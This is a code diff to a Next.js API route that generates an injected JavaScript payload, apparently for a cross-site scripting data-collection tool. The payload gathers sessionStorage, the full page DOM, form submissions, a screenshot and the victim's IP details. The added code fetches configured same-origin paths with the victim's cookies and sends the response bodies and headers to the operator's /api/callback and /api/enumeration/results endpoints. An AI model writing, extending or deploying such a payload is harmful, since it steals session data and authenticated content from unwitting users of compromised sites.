@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { queryOne, Setting } from '@/lib/db';
+import { query, queryOne, Setting, PathEnumerationConfig } from '@/lib/db';
 import { corsHeaders } from '@/lib/cors';
 
 async function getSetting(key: string, defaultValue: string): Promise<string> {
@@ -11,6 +11,17 @@ async function getSetting(key: string, defaultValue: string): Promise<string> {
     return setting?.value || defaultValue;
   } catch {
     return defaultValue;
+  }
+}
+
+async function getActivePathConfigs(): Promise<{ path: string; description: string | null }[]> {
+  try {
+    const configs = await query<PathEnumerationConfig>(
+      'SELECT path, description FROM path_enumeration_config WHERE active = true ORDER BY created_at ASC LIMIT 50'
+    );
+    return configs.map(c => ({ path: c.path, description: c.description }));
+  } catch {
+    return [];
   }
 }
 
@@ -43,11 +54,15 @@ export async function GET(request: NextRequest) {
   const cb = `${baseUrl}/api/callback`;
   const ps = `${baseUrl}/api/persist`;
   const tf = `${baseUrl}/api/traffic`;
+  const pe = `${baseUrl}/api/enumeration/results`;
 
   const screenshotEnabled = await getSetting('screenshot_enabled', 'true') === 'true';
   const persistentEnabled = await getSetting('persistent_enabled', 'false') === 'true';
   const advancedPersistentEnabled = await getSetting('advanced_persistent_enabled', 'false') === 'true';
   const persistentKey = await getSetting('persistent_key', '');
+  
+  // Get active path enumeration configs
+  const pathConfigs = await getActivePathConfigs();
 
   // Build payload  
   let js = `(function(){if(window.__n)return;window.__n=1;`;
@@ -77,8 +92,14 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
   js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
   js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>5000000)d.dom=d.dom.substring(0,5000000)}catch(e){d.dom="[DOM capture failed: "+e.message+"]"}`;
 
-  // Send function - FIXED: onload inside send()
-  js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
+  // Flag to track if IP info fetch is done and prevent duplicate sends
+  js += `var _ipDone=false;var _sent=false;`;
+
+  // Fetch IP info from ipinfo.io (client-side, async) - will be awaited before send
+  js += `function _fetchIpInfo(cb){try{fetch("https://ipinfo.io/json",{mode:"cors"}).then(function(r){return r.json()}).then(function(j){d.ip_info=JSON.stringify(j);_ipDone=true;cb()}).catch(function(){_ipDone=true;cb()})}catch(e){_ipDone=true;cb()}}`;
+
+  // Send function - FIXED: onload inside send() with duplicate send prevention
+  js += `function send(){if(_sent)return;_sent=true;var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
   js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;
 
   // Flush pending traffic and initialize advanced features after we have report ID
@@ -86,17 +107,40 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
     js += `_flushPending();setTimeout(function(){initAdvanced()},100);`;
   }
 
+  // Path enumeration - run after we have report ID
+  if (pathConfigs.length > 0) {
+    js += `setTimeout(function(){_enumPaths()},200);`;
+  }
+
   js += `}}catch(e){}};`;
   js += `x.send(JSON.stringify(d))}`;
 
+  // Path enumeration function
+  if (pathConfigs.length > 0) {
+    const pathsJson = JSON.stringify(pathConfigs);
+    js += `var _enumPaths=function(){if(!window.__rid)return;`;
+    js += `var paths=${pathsJson};var results=[];var done=0;`;
+    js += `function sendResults(){if(done>=paths.length&&results.length>0){try{var x=new XMLHttpRequest();x.open("POST","${pe}",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify({rid:window.__rid,results:results}))}catch(e){}}}`;
+    js += `paths.forEach(function(p){try{fetch(p.path,{credentials:"include",mode:"same-origin"}).then(function(r){var hdrs="";try{r.headers.forEach(function(v,k){hdrs+=k+": "+v+"\\r\\n"})}catch(e){}return r.text().then(function(b){results.push({path:p.path,description:p.description,status:r.status,size:b.length,body:b.substring(0,10000),headers:hdrs})}).catch(function(){results.push({path:p.path,description:p.description,status:r.status,size:0,error:"Failed to read body"})})}).catch(function(e){results.push({path:p.path,description:p.description,error:e.message||"Network error"})}).finally(function(){done++;sendResults()})}catch(e){done++;results.push({path:p.path,description:p.description,error:e.message||"Exception"});sendResults()}})};`;
+  }
+
   if (screenshotEnabled) {
+    // Start IP info fetch immediately
+    js += `_fetchIpInfo(function(){});`;
+    // Wrapper to ensure IP info is fetched before sending
+    js += `function _sendWhenReady(){if(_ipDone){send()}else{setTimeout(_sendWhenReady,50)}}`;
     js += `var sc=document.createElement("script");sc.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";`;
-    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);send()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;send()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;send()}};`;
-    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";send()};`;
-    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";send()}},10000);`;
+    js += `sc.onload=function(){try{html2canvas(document.body,{logging:false,useCORS:true,allowTaint:true,scale:1,width:Math.min(document.documentElement.scrollWidth,1920),height:Math.min(document.documentElement.scrollHeight,4000)}).then(function(c){d.screenshot=c.toDataURL("image/jpeg",0.8);_sendWhenReady()}).catch(function(e){d.screenshot_error="html2canvas: "+e.message;_sendWhenReady()})}catch(e){d.screenshot_error="html2canvas exception: "+e.message;_sendWhenReady()}};`;
+    js += `sc.onerror=function(){d.screenshot_error="Failed to load html2canvas from CDN";_sendWhenReady()};`;
+    js += `setTimeout(function(){if(!d.screenshot&&!d.screenshot_error){d.screenshot_error="html2canvas timeout";_sendWhenReady()}},10000);`;
+    // IP info timeout - force _ipDone after 3 seconds to not block too long
+    js += `setTimeout(function(){_ipDone=true},3000);`;
     js += `document.head.appendChild(sc);`;
   } else {
-    js += `send();`;
+    // No screenshot - fetch IP info then send
+    js += `_fetchIpInfo(function(){send()});`;
+    // IP info timeout - send after 3 seconds even if not done
+    js += `setTimeout(function(){if(!_ipDone){_ipDone=true;send()}},3000);`;
   }
 
   // Traffic Interception Mode - Auxiliary window controller
